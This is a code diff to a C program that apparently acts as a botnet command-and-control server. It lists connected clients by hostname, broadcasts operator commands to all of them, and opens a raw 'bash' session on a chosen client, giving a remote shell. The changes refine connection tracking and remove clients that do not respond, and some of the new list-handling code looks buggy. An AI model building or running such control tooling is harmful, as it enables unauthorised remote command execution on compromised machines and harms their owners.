@@ -14,19 +14,15 @@ Code has no functionality to exit cleanly.exir
 #include <sys/select.h>
 
 // Function declarations
-
 void print_connection(connection client_con, int new_fd);
 void print_welcome_message();
 void print_help_screen();
 void print_command_help_screen();
 void *handle_connection(void *my_connection);
 void *bot_command(void *current);
-int append_pfds(struct pollfd *pfds, int new_fd, int fd_count);
 
 // Global Graceful Exit Flag
 int exitflag = 0;
-
-// Structure of arguments for use with bot_command and handle_connection functions
 
 static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 
@@ -65,6 +61,8 @@ void *handle_connection(void *arg)
     socklen_t client_addr_size;
     int new_fd;
     int fd_count = 1;
+    // implemented for testing purposes. REMOVE.
+    int host_x = 0;
 
     printf("[+] Looking for connections\n");
 
@@ -111,9 +109,6 @@ void *handle_connection(void *arg)
                         new_con->pfds->fd = new_fd;
                         new_con->pfds->events = POLLIN;
 
-                        // Add connection information to master array
-                        fd_count = append_pfds(head->pfds, new_fd, fd_count);
-
                         // Get hostname from client
                         send(new_con->pfds->fd, "hostname", 8, 0);
                         char recieved_data[8192];
@@ -129,7 +124,8 @@ void *handle_connection(void *arg)
                         recieved_data[bytes_recv - 1] = '\0';
 
                         new_con->hostname = malloc(bytes_recv);
-                        sprintf(new_con->hostname, "%s", recieved_data);
+                        sprintf(new_con->hostname, "%s%d", recieved_data, host_x);
+                        host_x++;
                         printf("New Connection from %s\n", new_con->hostname);
 
                         // Release lock
@@ -138,24 +134,9 @@ void *handle_connection(void *arg)
                 }
             }
             current = current->next;
+            fd_count = count_connections(head);
         }
     }
-}
-
-// Append new connection file descriptor to array, returns the number of file descriptors
-int append_pfds(struct pollfd *pfds, int new_fd, int fd_count)
-{
-    // Increment count of assigned file descriptors
-    fd_count++;
-
-    // Increase size of array to accomodate new file descriptor
-    pfds = realloc(pfds, sizeof(pfds) * fd_count);
-
-    // Add file descriptor to array and set event to check for read
-    pfds[fd_count].fd = new_fd;
-    pfds[fd_count].events = POLLIN;
-
-    return fd_count;
 }
 
 void *bot_command(void *arg)
@@ -261,7 +242,7 @@ void *bot_command(void *arg)
                 // Send command to ALL connections except listener
                 else if (strcmp(data, "all") == 0)
                 {
-                    //this allows consecutive command message to all clients
+                    // This allows consecutive command message to all clients
                     while (1)
                     {
                         // Prompt user for input and remove trailing newline
@@ -275,11 +256,10 @@ void *bot_command(void *arg)
                         }
 
                         // Send data to client specified by user input, based on array index
-                        int i = 0;
                         tmp = head;
+                        tmp = tmp->next;
                         while (tmp != NULL)
                         {
-                            tmp = tmp->next;
                             send(tmp->pfds->fd, data, sizeof(data), 0);
                             // TODO: Limit the length of the data string below
                             printf("[+] Sent %s to %s\n", data, tmp->hostname);
@@ -291,15 +271,19 @@ void *bot_command(void *arg)
                             if (bytes_recv == 0)
                             {
                                 // Oops, our recv call failed.
-                                printf("[-] Unable to recieve from %s\n", tmp->hostname);
-                                i++;
+                                printf("[-] Unable to recieve from %s. Removing from active connections...\n", tmp->hostname);
+                                
+                                // Delete connection from list
+                                delete_connection(head, tmp);
+
                                 continue;
                             }
 
                             recieved_data[bytes_recv] = '\0';
                             printf("%s said: %s\n", tmp->hostname, recieved_data);
 
-                            i++;
+                            //i++;
+                            tmp = tmp->next;
                         }
                     }
                 }
@@ -307,7 +291,6 @@ void *bot_command(void *arg)
                 // Send command to SINGLE client
                 else if (strcmp(data, "single") == 0)
                 {
-
                     // Prompt user for input, remove trailing newline and convert input to int
                     printf("[Command][Single] Enter client: ");
                     fgets(data, sizeof(data), stdin);
@@ -332,6 +315,7 @@ void *bot_command(void *arg)
                     }
                     printf("[+] Entering raw input mode with client %s\n", tmp->hostname);
                     printf("[+] To escape raw mode, type exit\n");
+                    send(tmp->pfds->fd, "bash", 5, 0);
 
                     // This is where the ugly low-level stuff begins... Essentially the same code as the client side.
                     // Within the while loop, we shouldn't clutter the screen with lots of server generated messages
@@ -389,6 +373,7 @@ void *bot_command(void *arg)
                                     if (strstr(input, "exit") != NULL)
                                     {
                                         printf("[+] Exiting RAW mode\n");
+                                        write(tmp->pfds->fd, "exit", 5);
                                         safe_exit = 1;
                                         break;
                                     }
@@ -467,7 +452,6 @@ void print_help_screen()
     printf("help             : List of commands from console    \n");
     printf("exit             : Terminate the program            \n");
     printf("command          : Enter command control mode       \n");
-    //printf("back             : Back to the previous page        \n");
     printf("=====================================================\n\n");
     return;
 }
